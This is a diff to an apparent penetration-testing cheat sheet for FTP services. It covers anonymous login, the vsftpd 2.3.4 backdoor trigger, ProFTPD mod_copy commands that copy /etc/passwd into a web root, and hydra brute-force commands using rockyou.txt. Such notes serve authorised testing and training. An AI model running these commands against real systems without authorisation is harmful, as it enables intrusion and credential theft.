@@ -20,16 +20,14 @@ ftp <target>
 # Login: anonymous / anonymous@
 # Or: anonymous / (empty)
 
-# List and download
+# List first (mget * recursively pulls to cwd and can clobber local files)
 ftp> ls -la
-ftp> mget *
 ftp> cd ..      # try parent directories
 ```
 
 ## Version CVEs
 - **vsftpd 2.3.4**: Backdoor — connect to port 6200 after sending `:)` in username
-- **ProFTPD 1.3.5**: mod_copy RCE — `site cpfr /etc/passwd` → `site cpto /var/www/html/passwd.txt`
-- **ProFTPD <1.3.5b**: mod_copy unauthenticated file copy
+- **ProFTPD 1.3.5** (CVE-2015-3306): mod_copy unauthenticated file copy — `site cpfr /etc/passwd` → `site cpto /var/www/html/passwd.txt`
 
 ```bash
 # vsftpd 2.3.4 backdoor
@@ -45,6 +43,7 @@ curl http://<target>/leak.txt
 
 ## Credential Attacks
 ```bash
+# Low thread count: FTP servers often lock accounts or rate-limit after failures
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target> -t 4
 hydra -L users.txt -p password ftp://<target>
 ```
